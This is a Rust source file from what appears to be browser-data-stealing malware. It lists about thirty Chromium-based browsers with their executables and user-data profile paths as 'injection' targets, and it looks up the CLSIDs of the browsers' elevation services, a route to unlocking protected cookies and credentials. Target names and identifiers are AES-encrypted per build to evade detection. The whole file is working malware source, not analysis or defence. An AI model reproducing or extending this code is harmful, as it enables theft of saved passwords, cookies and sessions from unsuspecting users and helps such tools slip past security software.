//! Chromium browser targets: exe name + user data path for injection.
//! All plaintext browser names, exe names, and CLSIDs are now decrypted at
//! runtime from AES-256-GCM encrypted constants (unique per build).

use std::collections::HashMap;
use crate::polymorphic_keys::aes_decrypt;

#[derive(Clone, Copy)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone)]
pub struct ChromiumTarget {
    pub name: String,
    pub exe: String,
    pub user_data_rel: String,
    pub root: DataRoot,
    #[allow(dead_code)]
    pub clsid: String,
}

macro_rules! dec {
    ($name:ident) => {
        String::from_utf8(aes_decrypt(
            &crate::polymorphic_keys::$name##_ENC,
            &crate::polymorphic_keys::$name##_KEY,
            &crate::polymorphic_keys::$name##_NONCE,
        )).unwrap_or_default()
    };
}

fn targets() -> Vec<ChromiumTarget> {
    let chrome  = dec!(INJ_CHROME_EXE);
    let edge    = dec!(INJ_EDGE_EXE);
    let brave   = dec!(INJ_BRAVE_EXE);
    let vivaldi = dec!(INJ_VIVALDI_EXE);
    let opera   = dec!(INJ_OPERA_EXE);
    let browser = dec!(INJ_BROWSER_EXE);

    vec![
        ChromiumTarget { name: "Chrome".into(),              exe: chrome.clone(),  user_data_rel: r"Google\Chrome\User Data".into(),                         root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Chrome Beta".into(),         exe: chrome.clone(),  user_data_rel: r"Google\Chrome Beta\User Data".into(),                    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Chrome Dev".into(),          exe: chrome.clone(),  user_data_rel: r"Google\Chrome Dev\User Data".into(),                     root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Chrome Canary".into(),       exe: chrome.clone(),  user_data_rel: r"Google\Chrome SxS\User Data".into(),                     root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Chromium".into(),            exe: chrome.clone(),  user_data_rel: r"Chromium\User Data".into(),                              root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Edge".into(),                exe: edge.clone(),    user_data_rel: r"Microsoft\Edge\User Data".into(),                        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Edge Beta".into(),           exe: edge.clone(),    user_data_rel: r"Microsoft\Edge Beta\User Data".into(),                   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Edge Dev".into(),            exe: edge.clone(),    user_data_rel: r"Microsoft\Edge Dev\User Data".into(),                    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Brave".into(),               exe: brave.clone(),   user_data_rel: r"BraveSoftware\Brave-Browser\User Data".into(),           root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Brave Beta".into(),          exe: brave.clone(),   user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data".into(),      root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Brave Nightly".into(),       exe: brave.clone(),   user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data".into(),   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Opera".into(),               exe: opera.clone(),   user_data_rel: r"Opera Software\Opera Stable".into(),                    root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "OperaGX".into(),             exe: opera.clone(),   user_data_rel: r"Opera Software\Opera GX Stable".into(),                 root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "Opera Neon".into(),          exe: opera.clone(),   user_data_rel: r"Opera Software\Opera Neon\User Data".into(),             root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "Vivaldi".into(),             exe: vivaldi.clone(), user_data_rel: r"Vivaldi\User Data".into(),                               root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Yandex".into(),              exe: browser.clone(), user_data_rel: r"Yandex\YandexBrowser\User Data".into(),                  root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "CocCoc".into(),              exe: browser.clone(), user_data_rel: r"CocCoc\Browser\User Data".into(),                        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "CentBrowser".into(),         exe: chrome.clone(),  user_data_rel: r"CentBrowser\User Data".into(),                           root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "360Chrome".into(),           exe: "360chrome.exe".into(), user_data_rel: r"360Chrome\Chrome\User Data".into(),               root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Epic Privacy Browser".into(), exe: "epic.exe".into(), user_data_rel: r"Epic Privacy Browser\User Data".into(),               root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Uran".into(),                exe: "uran.exe".into(), user_data_rel: r"uCozMedia\Uran\User Data".into(),                      root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "7Star".into(),               exe: "7star.exe".into(), user_data_rel: r"7Star\7Star\User Data".into(),                        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Torch".into(),               exe: "torch.exe".into(), user_data_rel: r"Torch\User Data".into(),                              root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Kometa".into(),              exe: "kometa.exe".into(), user_data_rel: r"Kometa\User Data".into(),                            root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Orbitum".into(),             exe: "orbitum.exe".into(), user_data_rel: r"Orbitum\User Data".into(),                          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Amigo".into(),               exe: "amigo.exe".into(), user_data_rel: r"Amigo\User Data".into(),                              root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Sputnik".into(),             exe: "sputnik.exe".into(), user_data_rel: r"Sputnik\Sputnik\User Data".into(),                  root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Slimjet".into(),             exe: "slimjet.exe".into(), user_data_rel: r"Slimjet\User Data".into(),                          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Iridium".into(),             exe: "iridium.exe".into(), user_data_rel: r"Iridium\User Data".into(),                          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Thorium".into(),             exe: "thorium.exe".into(), user_data_rel: r"Thorium\User Data".into(),                          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: "Arc".into(),                 exe: "Arc.exe".into(), user_data_rel: r"The Browser Company\Arc\User Data".into(),              root: DataRoot::Local,   clsid: String::new() },
    ]
}

fn fallback_canonical_clsid(name: &str) -> Option<String> {
    match name {
        "Chrome"        => Some(dec!(INJ_CLSID_CHROME)),
        "Chrome Beta"   => Some(dec!(INJ_CLSID_CHROME_BETA)),
        "Chrome Dev"    => Some(dec!(INJ_CLSID_CHROME_DEV)),
        "Chrome Canary" => Some(dec!(INJ_CLSID_CHROME_CANARY)),
        "Edge"          => Some(dec!(INJ_CLSID_EDGE)),
        "Brave"         => Some(dec!(INJ_CLSID_BRAVE)),
        "Chromium" | "Vivaldi" | "Opera" | "Yandex" | "CocCoc" | "CentBrowser"
        | "360Chrome" | "Epic Privacy Browser" | "Uran" | "7Star" | "Torch"
        | "Kometa" | "Orbitum" | "Amigo" | "Sputnik" | "Slimjet" | "Iridium"
        | "Thorium" | "Arc" => Some(dec!(INJ_CLSID_CHROME)),
        _ => None,
    }
}

/// Returns canonical CLSIDs for browser elevation services (no registry scanning).
pub fn discover_elevation_services() -> HashMap<String, String> {
    let mut map: HashMap<String, String> = HashMap::new();
    for t in targets() {
        if let Some(c) = fallback_canonical_clsid(&t.name) {
            map.insert(t.name.clone(), c);
        }
    }
    map
}

pub fn find_target(name: &str) -> Option<ChromiumTarget> {
    let name_lower = name.to_lowercase();
    targets().into_iter().find(|t| t.name.to_lowercase() == name_lower)
}

pub fn find_real_profile_dir(browser_name: &str) -> Option<std::path::PathBuf> {
    let local_key  = dec!(INJ_PATH_LOCALAPPDATA);
    let roaming_key = dec!(INJ_PATH_APPDATA);
    let local   = std::env::var(&local_key).ok()?;
    let roaming = std::env::var(&roaming_key).ok()?;
    let target  = find_target(browser_name)?;
    let base = match target.root {
        DataRoot::Local   => std::path::PathBuf::from(local),
        DataRoot::Roaming => std::path::PathBuf::from(roaming),
    };
    let profile = base.join(&target.user_data_rel);
    if profile.exists() { Some(profile) } else { None }
}
